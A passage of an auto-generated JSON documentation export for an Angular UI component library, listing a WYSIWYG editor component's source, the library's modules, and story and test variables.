            "sourceCode": "import { AfterViewInit, Component, ElementRef, EventEmitter, Input, NgZone, OnDestroy, Output, ViewChild } from '@angular/core';\nimport { SafeHtml } from '@angular/platform-browser';\nimport { fromEvent, Subject } from 'rxjs';\nimport { debounceTime, takeUntil } from 'rxjs/operators';\n\n@Component({\n  selector: 'sto-wysiwyg-editor',\n  templateUrl: './wysiwyg-editor.component.html',\n  styleUrls: [ './wysiwyg-editor.component.scss' ]\n})\nexport class WysiwygEditorComponent implements AfterViewInit, OnDestroy {\n  @Input()\n  content: SafeHtml;\n  @Input()\n  readonly: boolean;\n  @ViewChild('editor')\n  editor: ElementRef<HTMLDivElement>;\n  @Output()\n  valueChanged = new EventEmitter<string>();\n  public warning: string | null;\n\n  private destroyed$ = new Subject<boolean>();\n\n  constructor(private zone: NgZone) {\n  }\n\n\n  ngOnDestroy(): void {\n    this.destroyed$.next(true);\n    this.destroyed$.complete();\n  }\n\n  ngAfterViewInit() {\n    this.listenForValueChange();\n  }\n\n  private listenForValueChange() {\n    fromEvent(this.editor.nativeElement, 'input')\n      .pipe(\n        debounceTime(100),\n        takeUntil(this.destroyed$)\n      ).subscribe(ev => {\n      this.warning = null;\n      this.valueChanged.emit(( ev.target as HTMLElement ).innerHTML);\n    });\n  }\n\n  onPaste(event: ClipboardEvent) {\n    if ( this.readonly ) {\n      return;\n    }\n    if (!event.clipboardData) {\n      return;\n    }\n    const img = event.clipboardData.files.item(0);\n    if ( !!img && img.type.includes('image') ) {\n      // event.preventDefault();\n      this.insertImage(img);\n    } else if ( !img ) {\n      this.pasteText(event);\n    }\n  }\n\n  private pasteText(event: ClipboardEvent) {\n    if (!event.clipboardData) {\n      return;\n    }\n    const html = event.clipboardData.getData('text/html');\n    const hasImage: boolean = /<img/.test(html);\n    if ( hasImage ) {\n      event.preventDefault();\n      this.warning = `Some images were not included due to browser security around mixed content. Try to paste the image separately.`;\n      const stripped = this.stripImageSection(html);\n      const el = document.createElement('div');\n      el.innerHTML = stripped;\n      const sel = document.getSelection();\n      if (!sel) {\n        return;\n      }\n      const range = sel.getRangeAt(0);\n      range.deleteContents();\n      range.insertNode(el);\n      sel.removeAllRanges();\n      range.collapse();\n      sel.addRange(range);\n    }\n  }\n\n  private stripImageSection(html: string) {\n    const div = document.createElement('div');\n    div.innerHTML = html;\n    const images = div.querySelectorAll('img');\n    Array.from(images)\n      .forEach(image => {\n        let el = image as HTMLElement;\n        while ( el.parentElement && el.parentElement !== div ) {\n          el = el.parentElement;\n        }\n        div.removeChild(el);\n      });\n    return div.innerHTML;\n  }\n\n  private insertImage(img: File) {\n    const fr = new FileReader();\n    fr.onloadend = (loadEvent) => {\n      this.zone.runOutsideAngular(() => {\n        const res = ( loadEvent.currentTarget as FileReader ).result as string;\n        const el = document.createElement('img');\n        el.title = `${img.name}`;\n        el.src = res;\n        el.style.maxHeight = '300px';\n        const sel = document.getSelection();\n        if (!sel) {\n          return;\n        }\n        const range = sel.getRangeAt(0);\n        const cont = range.endContainer;\n        if ( !this.editor.nativeElement.contains(cont) ) {\n          range.setStart(this.editor.nativeElement, 0);\n        }\n        range.deleteContents();\n        range.insertNode(el);\n        sel.removeAllRanges();\n        range.collapse();\n        sel.addRange(range);\n        this.valueChanged.emit(this.editor.nativeElement.innerHTML);\n        this.warning = null;\n      });\n    };\n    fr.readAsDataURL(img);\n  }\n\n  onDrop(event: DragEvent) {\n    if ( this.readonly || !event.dataTransfer ) {\n      return;\n    }\n    if ( event.dataTransfer.types.includes('Files') ) {\n      event.preventDefault();\n      const img = event.dataTransfer.files.item(0);\n      if (img) {\n        this.insertImage(img);\n      }\n    }\n  }\n}\n",
            "assetsDirs": [],
            "styleUrlsData": [
                {
                    "data": ":host {\n  display: contents;\n}\n",
                    "styleUrl": "./wysiwyg-editor.component.scss"
                }
            ],
            "stylesData": "",
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "zone",
                        "type": "NgZone"
                    }
                ],
                "line": 22,
                "jsdoctags": [
                    {
                        "name": "zone",
                        "type": "NgZone",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            },
            "implements": [
                "AfterViewInit",
                "OnDestroy"
            ],
            "templateData": "<div class=\"sto-wysiwyg__editor\"\n     (dragover)=\"$event.preventDefault(); $event.stopPropagation();\"\n     (drop)=\"onDrop($event)\"\n     [class.sto-wysiwyg__editor--readonly]=\"readonly\"\n     [innerHTML]=\"content\"\n     (paste)=\"onPaste($event)\"\n     #editor\n     [attr.contenteditable]=\"!readonly\"></div>\n<span class=\"error\"\n      *ngIf=\"warning\">{{ warning }}</span>\n"
        }
    ],
    "modules": [
        {
            "name": "AppModule",
            "children": [
                {
                    "type": "providers",
                    "elements": []
                },
                {
                    "type": "declarations",
                    "elements": [
                        {
                            "name": "AppComponent"
                        }
                    ]
                },
                {
                    "type": "imports",
                    "elements": []
                },
                {
                    "type": "exports",
                    "elements": []
                },
                {
                    "type": "bootstrap",
                    "elements": [
                        {
                            "name": "AppComponent"
                        }
                    ]
                },
                {
                    "type": "classes",
                    "elements": []
                }
            ]
        },
        {
            "name": "ConfirmerModule",
            "children": [
                {
                    "type": "providers",
                    "elements": []
                },
                {
                    "type": "declarations",
                    "elements": [
                        {
                            "name": "ConfirmDemoComponent"
                        }
                    ]
                },
                {
                    "type": "imports",
                    "elements": []
                },
                {
                    "type": "exports",
                    "elements": [
                        {
                            "name": "ConfirmDemoComponent"
                        }
                    ]
                },
                {
                    "type": "bootstrap",
                    "elements": []
                },
                {
                    "type": "classes",
                    "elements": []
                }
            ]
        },
        {
            "name": "ConfirmModule",
            "children": [
                {
                    "type": "providers",
                    "elements": [
                        {
                            "name": "ConfirmService"
                        }
                    ]
                },
                {
                    "type": "declarations",
                    "elements": [
                        {
                            "name": "ConfirmComponent"
                        }
                    ]
                },
                {
                    "type": "imports",
                    "elements": []
                },
                {
                    "type": "exports",
                    "elements": []
                },
                {
                    "type": "bootstrap",
                    "elements": []
                },
                {
                    "type": "classes",
                    "elements": []
                }
            ]
        },
        {
            "name": "ErrorHandlerModule",
            "children": [
                {
                    "type": "providers",
                    "elements": [
                        {
                            "name": "ErrorDialogService"
                        },
                        {
                            "name": "ErrorHandlerService"
                        }
                    ]
                },
                {
                    "type": "declarations",
                    "elements": [
                        {
                            "name": "DialogComponent"
                        }
                    ]
                },
                {
                    "type": "imports",
                    "elements": []
                },
                {
                    "type": "exports",
                    "elements": []
                },
                {
                    "type": "bootstrap",
                    "elements": []
                },
                {
                    "type": "classes",
                    "elements": []
                }
            ]
        },
        {
            "name": "MaterialModule",
            "children": [
                {
                    "type": "providers",
                    "elements": []
                },
                {
                    "type": "declarations",
                    "elements": []
                },
                {
                    "type": "imports",
                    "elements": []
                },
                {
                    "type": "exports",
                    "elements": []
                },
                {
                    "type": "bootstrap",
                    "elements": []
                },
                {
                    "type": "classes",
                    "elements": []
                }
            ]
        },
        {
            "name": "NumberInputModule",
            "children": [
                {
                    "type": "providers",
                    "elements": []
                },
                {
                    "type": "declarations",
                    "elements": [
                        {
                            "name": "NumberInputComponent"
                        },
                        {
                            "name": "NumberInputDirective"
                        },
                        {
                            "name": "NumberInputPipe"
                        },
                        {
                            "name": "NumberUnitInputComponent"
                        }
                    ]
                },
                {
                    "type": "imports",
                    "elements": []
                },
                {
                    "type": "exports",
                    "elements": [
                        {
                            "name": "NumberInputComponent"
                        },
                        {
                            "name": "NumberInputDirective"
                        },
                        {
                            "name": "NumberInputPipe"
                        },
                        {
                            "name": "NumberUnitInputComponent"
                        }
                    ]
                },
                {
                    "type": "bootstrap",
                    "elements": []
                },
                {
                    "type": "classes",
                    "elements": []
                }
            ]
        },
        {
            "name": "PreferenceManagerModule",
            "children": [
                {
                    "type": "providers",
                    "elements": []
                },
                {
                    "type": "declarations",
                    "elements": [
                        {
                            "name": "ActivePreferencePipe"
                        },
                        {
                            "name": "PreferenceManagerComponent"
                        }
                    ]
                },
                {
                    "type": "imports",
                    "elements": []
                },
                {
                    "type": "exports",
                    "elements": [
                        {
                            "name": "PreferenceManagerComponent"
                        }
                    ]
                },
                {
                    "type": "bootstrap",
                    "elements": []
                },
                {
                    "type": "classes",
                    "elements": []
                }
            ]
        },
        {
            "name": "SlideToggleModule",
            "children": [
                {
                    "type": "providers",
                    "elements": []
                },
                {
                    "type": "declarations",
                    "elements": [
                        {
                            "name": "SlideToggleComponent"
                        }
                    ]
                },
                {
                    "type": "imports",
                    "elements": []
                },
                {
                    "type": "exports",
                    "elements": [
                        {
                            "name": "SlideToggleComponent"
                        }
                    ]
                },
                {
                    "type": "bootstrap",
                    "elements": []
                },
                {
                    "type": "classes",
                    "elements": []
                }
            ]
        },
        {
            "name": "StoActionFooterModule",
            "children": [
                {
                    "type": "providers",
                    "elements": []
                },
                {
                    "type": "declarations",
                    "elements": [
                        {
                            "name": "StoActionFooterComponent"
                        }
                    ]
                },
                {
                    "type": "imports",
                    "elements": []
                },
                {
                    "type": "exports",
                    "elements": [
                        {
                            "name": "StoActionFooterComponent"
                        }
                    ]
                },
                {
                    "type": "bootstrap",
                    "elements": []
                },
                {
                    "type": "classes",
                    "elements": []
                }
            ]
        },
        {
            "name": "StoAppHeaderModule",
            "children": [
                {
                    "type": "providers",
                    "elements": []
                },
                {
                    "type": "declarations",
                    "elements": [
                        {
                            "name": "StoAppHeaderComponent"
                        }
                    ]
                },
                {
                    "type": "imports",
                    "elements": [
                        {
                            "name": "StoBreadcrumbsModule"
                        }
                    ]
                },
                {
                    "type": "exports",
                    "elements": [
                        {
                            "name": "StoAppHeaderComponent"
                        }
                    ]
                },
                {
                    "type": "bootstrap",
                    "elements": []
                },
                {
                    "type": "classes",
                    "elements": []
                }
            ]
        },
        {
            "name": "StoBreadcrumbsModule",
            "children": [
                {
                    "type": "providers",
                    "elements": []
                },
                {
                    "type": "declarations",
                    "elements": [
                        {
                            "name": "StoBreadcrumbsComponent"
                        }
                    ]
                },
                {
                    "type": "imports",
                    "elements": []
                },
                {
                    "type": "exports",
                    "elements": [
                        {
                            "name": "StoBreadcrumbsComponent"
                        }
                    ]
                },
                {
                    "type": "bootstrap",
                    "elements": []
                },
                {
                    "type": "classes",
                    "elements": []
                }
            ]
        },
        {
            "name": "StoDatatableModule",
            "children": [
                {
                    "type": "providers",
                    "elements": []
                },
                {
                    "type": "declarations",
                    "elements": [
                        {
                            "name": "ColumnStylePipe"
                        },
                        {
                            "name": "ExecPipe"
                        },
                        {
                            "name": "StoDataTableActionsLeftComponent"
                        },
                        {
                            "name": "StoDataTableActionsRightComponent"
                        },
                        {
                            "name": "StoDatatableActionsComponent"
                        },
                        {
                            "name": "StoDatatableBodyComponent"
                        },
                        {
                            "name": "StoDatatableBodyRowComponent"
                        },
                        {
                            "name": "StoDatatableComponent"
                        },
                        {
                            "name": "StoDatatableHeaderComponent"
                        },
                        {
                            "name": "StoDatatableHeaderGroupComponent"
                        },
                        {
                            "name": "StoDatatableResizeDirective"
                        }
                    ]
                },
                {
                    "type": "imports",
                    "elements": []
                },
                {
                    "type": "exports",
                    "elements": [
                        {
                            "name": "StoDataTableActionsLeftComponent"
                        },
                        {
                            "name": "StoDataTableActionsRightComponent"
                        },
                        {
                            "name": "StoDatatableActionsComponent"
                        },
                        {
                            "name": "StoDatatableComponent"
                        }
                    ]
                },
                {
                    "type": "bootstrap",
                    "elements": []
                },
                {
                    "type": "classes",
                    "elements": []
                }
            ]
        },
        {
            "name": "StoDirectivesModule",
            "children": [
                {
                    "type": "providers",
                    "elements": []
                },
                {
                    "type": "declarations",
                    "elements": [
                        {
                            "name": "ContextMenuDirective"
                        },
                        {
                            "name": "DateFormFieldClickDirective"
                        },
                        {
                            "name": "MenuOverlayDirective"
                        },
                        {
                            "name": "QuickKeysDirective"
                        },
                        {
                            "name": "StoGridColumnDirective"
                        },
                        {
                            "name": "StoGridDirective"
                        },
                        {
                            "name": "StoGridSpacerDirective"
                        },
                        {
                            "name": "StoSelectTextOnFocusDirective"
                        }
                    ]
                },
                {
                    "type": "imports",
                    "elements": []
                },
                {
                    "type": "exports",
                    "elements": [
                        {
                            "name": "ContextMenuDirective"
                        },
                        {
                            "name": "DateFormFieldClickDirective"
                        },
                        {
                            "name": "MenuOverlayDirective"
                        },
                        {
                            "name": "QuickKeysDirective"
                        },
                        {
                            "name": "StoGridColumnDirective"
                        },
                        {
                            "name": "StoGridDirective"
                        },
                        {
                            "name": "StoGridSpacerDirective"
                        },
                        {
                            "name": "StoSelectTextOnFocusDirective"
                        }
                    ]
                },
                {
                    "type": "bootstrap",
                    "elements": []
                },
                {
                    "type": "classes",
                    "elements": []
                }
            ]
        },
        {
            "name": "StoDrawerModule",
            "children": [
                {
                    "type": "providers",
                    "elements": []
                },
                {
                    "type": "declarations",
                    "elements": [
                        {
                            "name": "StoDrawerComponent"
                        },
                        {
                            "name": "StoDrawerFooterComponent"
                        },
                        {
                            "name": "StoDrawerHeaderComponent"
                        },
                        {
                            "name": "StoDrawerWrapperComponent"
                        }
                    ]
                },
                {
                    "type": "imports",
                    "elements": []
                },
                {
                    "type": "exports",
                    "elements": [
                        {
                            "name": "StoDrawerComponent"
                        },
                        {
                            "name": "StoDrawerFooterComponent"
                        },
                        {
                            "name": "StoDrawerHeaderComponent"
                        },
                        {
                            "name": "StoDrawerWrapperComponent"
                        }
                    ]
                },
                {
                    "type": "bootstrap",
                    "elements": []
                },
                {
                    "type": "classes",
                    "elements": []
                }
            ]
        },
        {
            "name": "StoFilterPanelModule",
            "children": [
                {
                    "type": "providers",
                    "elements": []
                },
                {
                    "type": "declarations",
                    "elements": [
                        {
                            "name": "StoFilterActions"
                        },
                        {
                            "name": "StoFilterActionsBar"
                        },
                        {
                            "name": "StoFilterPanelComponent"
                        },
                        {
                            "name": "StoFilterTableActions"
                        },
                        {
                            "name": "StoFilterTitle"
                        }
                    ]
                },
                {
                    "type": "imports",
                    "elements": []
                },
                {
                    "type": "exports",
                    "elements": [
                        {
                            "name": "StoFilterActions"
                        },
                        {
                            "name": "StoFilterPanelComponent"
                        },
                        {
                            "name": "StoFilterTableActions"
                        },
                        {
                            "name": "StoFilterTitle"
                        }
                    ]
                },
                {
                    "type": "bootstrap",
                    "elements": []
                },
                {
                    "type": "classes",
                    "elements": []
                }
            ]
        },
        {
            "name": "StoFormModule",
            "children": [
                {
                    "type": "providers",
                    "elements": []
                },
                {
                    "type": "declarations",
                    "elements": [
                        {
                            "name": "FormFieldDirective"
                        }
                    ]
                },
                {
                    "type": "imports",
                    "elements": []
                },
                {
                    "type": "exports",
                    "elements": [
                        {
                            "name": "FormFieldDirective"
                        }
                    ]
                },
                {
                    "type": "bootstrap",
                    "elements": []
                },
                {
                    "type": "classes",
                    "elements": []
                }
            ]
        },
        {
            "name": "StoMessagePanelModule",
            "children": [
                {
                    "type": "providers",
                    "elements": []
                },
                {
                    "type": "declarations",
                    "elements": [
                        {
                            "name": "StoMessagePanelComponent"
                        }
                    ]
                },
                {
                    "type": "imports",
                    "elements": []
                },
                {
                    "type": "exports",
                    "elements": [
                        {
                            "name": "StoMessagePanelComponent"
                        }
                    ]
                },
                {
                    "type": "bootstrap",
                    "elements": []
                },
                {
                    "type": "classes",
                    "elements": []
                }
            ]
        },
        {
            "name": "StoNavigationModule",
            "children": [
                {
                    "type": "providers",
                    "elements": []
                },
                {
                    "type": "declarations",
                    "elements": [
                        {
                            "name": "NavigationMenuComponent"
                        },
                        {
                            "name": "NavigationMenuItemComponent"
                        },
                        {
                            "name": "NavigationPartComponent"
                        }
                    ]
                },
                {
                    "type": "imports",
                    "elements": []
                },
                {
                    "type": "exports",
                    "elements": [
                        {
                            "name": "NavigationMenuComponent"
                        },
                        {
                            "name": "NavigationMenuItemComponent"
                        },
                        {
                            "name": "NavigationPartComponent"
                        }
                    ]
                },
                {
                    "type": "bootstrap",
                    "elements": []
                },
                {
                    "type": "classes",
                    "elements": []
                }
            ]
        },
        {
            "name": "StoPipesModule",
            "children": [
                {
                    "type": "providers",
                    "elements": []
                },
                {
                    "type": "declarations",
                    "elements": [
                        {
                            "name": "CurrencyFormatPipe"
                        },
                        {
                            "name": "DateFormatPipe"
                        },
                        {
                            "name": "ExcludeUnit"
                        },
                        {
                            "name": "GetUnit"
                        },
                        {
                            "name": "KeysPipe"
                        },
                        {
                            "name": "NumberFormatPipe"
                        },
                        {
                            "name": "YesNoPipe"
                        }
                    ]
                },
                {
                    "type": "imports",
                    "elements": []
                },
                {
                    "type": "exports",
                    "elements": [
                        {
                            "name": "CurrencyFormatPipe"
                        },
                        {
                            "name": "DateFormatPipe"
                        },
                        {
                            "name": "ExcludeUnit"
                        },
                        {
                            "name": "GetUnit"
                        },
                        {
                            "name": "KeysPipe"
                        },
                        {
                            "name": "NumberFormatPipe"
                        },
                        {
                            "name": "YesNoPipe"
                        }
                    ]
                },
                {
                    "type": "bootstrap",
                    "elements": []
                },
                {
                    "type": "classes",
                    "elements": []
                }
            ]
        },
        {
            "name": "StoSelectFilterModule",
            "children": [
                {
                    "type": "providers",
                    "elements": []
                },
                {
                    "type": "declarations",
                    "elements": [
                        {
                            "name": "StoSelectFilterComponent"
                        }
                    ]
                },
                {
                    "type": "imports",
                    "elements": []
                },
                {
                    "type": "exports",
                    "elements": [
                        {
                            "name": "StoSelectFilterComponent"
                        }
                    ]
                },
                {
                    "type": "bootstrap",
                    "elements": []
                },
                {
                    "type": "classes",
                    "elements": []
                }
            ]
        },
        {
            "name": "StoThemeModule",
            "children": [
                {
                    "type": "providers",
                    "elements": []
                },
                {
                    "type": "declarations",
                    "elements": []
                },
                {
                    "type": "imports",
                    "elements": []
                },
                {
                    "type": "exports",
                    "elements": []
                },
                {
                    "type": "bootstrap",
                    "elements": []
                },
                {
                    "type": "classes",
                    "elements": []
                }
            ]
        },
        {
            "name": "StoUserPreferenceModule",
            "children": [
                {
                    "type": "providers",
                    "elements": []
                },
                {
                    "type": "declarations",
                    "elements": [
                        {
                            "name": "StoUserPreferenceComponent"
                        }
                    ]
                },
                {
                    "type": "imports",
                    "elements": []
                },
                {
                    "type": "exports",
                    "elements": [
                        {
                            "name": "StoUserPreferenceComponent"
                        }
                    ]
                },
                {
                    "type": "bootstrap",
                    "elements": []
                },
                {
                    "type": "classes",
                    "elements": []
                }
            ]
        },
        {
            "name": "StoWysiwygModule",
            "children": [
                {
                    "type": "providers",
                    "elements": []
                },
                {
                    "type": "declarations",
                    "elements": [
                        {
                            "name": "WysiwygActionsComponent"
                        },
                        {
                            "name": "WysiwygComponent"
                        },
                        {
                            "name": "WysiwygEditorComponent"
                        }
                    ]
                },
                {
                    "type": "imports",
                    "elements": []
                },
                {
                    "type": "exports",
                    "elements": [
                        {
                            "name": "WysiwygComponent"
                        }
                    ]
                },
                {
                    "type": "bootstrap",
                    "elements": []
                },
                {
                    "type": "classes",
                    "elements": []
                }
            ]
        },
        {
            "name": "WrapperModule",
            "children": [
                {
                    "type": "providers",
                    "elements": []
                },
                {
                    "type": "declarations",
                    "elements": [
                        {
                            "name": "NextWrapperComponent"
                        }
                    ]
                },
                {
                    "type": "imports",
                    "elements": []
                },
                {
                    "type": "exports",
                    "elements": [
                        {
                            "name": "NextWrapperComponent"
                        }
                    ]
                },
                {
                    "type": "bootstrap",
                    "elements": []
                },
                {
                    "type": "classes",
                    "elements": []
                }
            ]
        }
    ],
    "miscellaneous": {
        "variables": [
            {
                "name": "Accent",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "type": "Story<StoMessagePanelComponent>",
                "defaultValue": "(args: StoMessagePanelComponent) => {\n  return {\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"accent\" [dismissable]=\"false\" icon=\"info\">Accent Text Content</sto-message-panel>'\n  };\n}"
            },
            {
                "name": "Actionbar",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/datatable/src/lib/datatable-custom.stories.ts",
                "type": "Story<Partial<StoDatatableComponent<Record<string, unknown>>>>",
                "defaultValue": "args => ( {\n  props: args,\n  template: `<h3>With an actionbar on the top left and right side</h3>\n<sto-datatable [virtualScroll]=\"true\" [scrollbarH]=\"true\" [autoSize]=\"true\" [footerRow]=\"footerRow\" [autoSizeOffset]=\"autoSizeOffset\" [height]=\"height\" [rows]=\"rows\" [columns]=\"columns\">\n  <sto-datatable-actions>\n      <sto-datatable-actions-left>\n        <button mat-icon-button><mat-icon>content_copy</mat-icon></button>\n        <button mat-icon-button><mat-icon>delete</mat-icon></button>\n       </sto-datatable-actions-left>\n      <sto-datatable-actions-right>\n        <button mat-icon-button><mat-icon>settings</mat-icon></button>\n      </sto-datatable-actions-right>\n  </sto-datatable-actions>\n</sto-datatable>`,\n} )"
            },
            {
                "name": "ActionFooter",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-action-footer/action-footer.stories.ts",
                "type": "",
                "defaultValue": "Template.bind({})"
            },
            {
                "name": "ALL_GRIDS",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
                "type": "[]",
                "defaultValue": "[ 'sto-f-grid--1', 'sto-f-grid--2', 'sto-f-grid--4', 'sto-f-grid--6' ]"
            },
            {
                "name": "AppHeader",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
                "type": "",
                "defaultValue": "Template.bind({})"
            },
            {
                "name": "argTypes",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "type": "object",
                "defaultValue": "{\n  color: { control: { disable: true } },\n  dismissable: { control: { disable: true } },\n  icon: { control: { disable: true } },\n  severity: { control: { disable: true } },\n}"
            },
            {
                "name": "AsTestEnvironment",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
                "type": "Story<StoAppHeaderComponent>",
                "defaultValue": "(args: StoAppHeaderComponent) => {\n  return {\n    props: {\n      environmentName: 'Systemtest',\n      testEnvironment: true,\n      ...args\n    },\n    template: `<sto-app-header [breadCrumbs]=\"[ { label: 'Root' }, { label: 'SubModule' } ]\" [environmentName]=\"environmentName\" [testEnvironment]=\"true\"></sto-app-header>`\n  };\n}"
            },
            {
                "name": "AutoSize",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/datatable/src/lib/datatable-custom.stories.ts",
                "type": "Story",
                "defaultValue": "(args) => ( {\n  props: args,\n  template: `<h3>Autosize will ensure the table always uses all available height top-down</h3>\n<sto-datatable [virtualScroll]=\"true\" [autoSize]=\"true\" [autoSizeOffset]=\"autosizeOffset\" [height]=\"height\" [rows]=\"rows\" [columns]=\"columns\">\n</sto-datatable>`,\n} )"
            },
            {
                "name": "breadCrumbs",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/test-utils.ts",
                "type": "Breadcrumb[]",
                "defaultValue": "[\n  {\n    label: 'One',\n    command: () => {\n      console.log('Wat?');\n    },\n    segment: '1',\n  }, {\n    label: 'Two',\n    command: () => {\n    },\n    segment: '2',\n  },\n]"
            },
            {
                "name": "COLORS",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-message-panel/sto-message-panel.component.ts",
                "type": "[]",
                "defaultValue": "[\n  'primary', 'accent', 'warning', 'danger', 'success'\n]",
                "description": "<p>Message panel to display inline info boxes.\nCan be of severity warning, error or info.</p>\n"
            },
            {
                "name": "columns",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/datatable/src/testing/utils.ts",
                "type": "Column[]",
                "defaultValue": "[\n  { prop: 'invoiceNo', name: 'invoiceNo', },\n  { prop: 'voyageNo', name: 'voyageNo', },\n  { prop: 'vesselName', name: 'vesselName', },\n  { prop: 'allocated', name: 'allocated', },\n  { prop: 'total', name: 'total' },\n]"
            },
            {
                "name": "columns",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/datatable/src/lib/rows.ts",
                "type": "[]",
                "defaultValue": "[\n  {\n    prop: 'invoiceNo',\n    name: 'Invoice# (randsort)',\n    flexBasis: 200,\n    flexShrink: 1,\n    flexGrow: 1,\n    // random sort\n    sortFn: () => {\n      let n = Math.round(Math.random() * 1000);\n      if (n < 500) {\n        n = -n;\n      }\n      return n;\n    }\n  },\n  {\n    prop: 'voyageNo',\n    flexBasis: 200,\n    disableResize: true,\n    name: 'Voyage# (no resize)',\n    disableSort: true,\n    headerClass: 'aclass',\n    cellClass: () => {\n      return 'a-cell-class';\n    }\n  },\n  {\n    prop: 'vesselName',\n    flexBasis: 200,\n    name: 'Vessel',\n    headerClass: 'bclass',\n    flexGrow: 1\n  },\n  {\n    prop: 'allocated',\n    flexBasis: 200,\n    name: 'Allocated',\n    headerClass: 'aclass'\n  },\n  {\n    prop: 'total',\n    flexBasis: 200,\n    name: 'Total',\n    headerClass: 'aclass',\n    cellClass: 'a-cell-class'\n  }\n]"
            },
            {
                "name": "context",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/test.ts",
                "type": "",
                "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
            },
            {
                "name": "context",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/datatable/src/test.ts",
                "type": "",
                "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
            },
            {
                "name": "context",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/core/src/test.ts",
                "type": "",
                "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
            },
            {
                "name": "context",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/drawer/src/test.ts",
                "type": "",
                "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
            },
            {
                "name": "context",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/error-handler/src/test.ts",
                "type": "",
                "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
            },
            {
                "name": "context",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/form/src/test.ts",
                "type": "",
                "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
            },
            {
                "name": "control",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/form/src/lib/number-input/value-unit-input.stories.ts",
                "type": "",
                "defaultValue": "new FormControl({ value: 32.123, unit: 'C' }, Validators.required)"
            },
            {
                "name": "CUSTOM_ERROR_HANDLER",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/error-handler/src/lib/error-handler/token.ts",
                "type": "",
                "defaultValue": "new InjectionToken<ErrorHandler>('sto.custom-error-handler')"
            },
            {
                "name": "Danger",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "type": "Story<StoMessagePanelComponent>",
                "defaultValue": "(args: StoMessagePanelComponent) => {\n  return {\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" color=\"danger\" [dismissable]=\"false\" icon=\"error\">Danger Text Content (a little to red atm.. :) )</sto-message-panel>'\n  };\n}"
            },
            {
                "name": "dialogConfig",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-confirm-dialog/confirm-dialog.stories.ts",
                "type": "",
                "defaultValue": "new MatDialogConfig()"
            },
            {
                "name": "Dismissable",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-message-panel/message-panel.stories.ts",
                "type": "Story<StoMessagePanelComponent>",
                "defaultValue": "(args: StoMessagePanelComponent) => {\n  return {\n    props: { dismiss: action('Dismissed') },\n    template: '<sto-message-panel (dismissed)=\"dismiss()\" [dismissable]=\"true\">Dismissable Text Content</sto-message-panel>'\n  };\n}"
            },
            {
                "name": "environment",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "apps/oilmod-web/src/environments/environment.prod.ts",
                "type": "object",
                "defaultValue": "{\n  production: true,\n}"
            },
            {
                "name": "environment",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "apps/oilmod-web/src/environments/environment.ts",
                "type": "object",
                "defaultValue": "{\n  production: false,\n}"
            },
            {
                "name": "ERROR_LOGGER",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/error-handler/src/lib/error-handler/token.ts",
                "type": "",
                "defaultValue": "new InjectionToken<ErrorLogger>('sto.error-logger')"
            },
            {
                "name": "FilterPanel",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-filter/filter-panel.stories.ts",
                "type": "",
                "defaultValue": "Template.bind({})"
            },
            {
                "name": "fixedColumns",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/datatable/src/lib/rows.ts",
                "type": "[]",
                "defaultValue": "[...columns.map(col => ({...col, flexGrow: 0})), ...columns.map(col => ({\n  ...col,\n  flexGrow: 0\n}))]"
            },
            {
                "name": "getClass",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
                "type": "",
                "defaultValue": "(width: number, small = 400, large = 800) => {\n  let cols = 1;\n  if ( width > small ) {\n    cols += 1;\n  }\n  if ( width > large ) {\n    cols += 2;\n  }\n  return `sto-f-grid--${cols}`;\n}"
            },
            {
                "name": "getGreeting",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "apps/oilmod-web-e2e/src/support/app.po.ts",
                "type": "",
                "defaultValue": "() => cy.get('h1')"
            },
            {
                "name": "importer",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "tools/scripts/build-scss.ts",
                "type": "",
